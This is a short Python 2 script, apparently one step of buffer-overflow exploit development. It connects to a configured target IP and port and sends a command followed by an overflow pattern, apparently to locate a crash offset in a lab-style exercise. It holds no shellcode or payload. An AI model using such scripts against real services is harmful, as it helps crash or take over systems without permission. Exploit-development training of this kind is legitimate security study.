#!/usr/bin/python
import sys,socket
from machineConstants import *
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((targetIP,port))
    s.send((command + buffer_pattern))
    s.close()
except:
    print "Error connecting to the server"
    sys.exit()
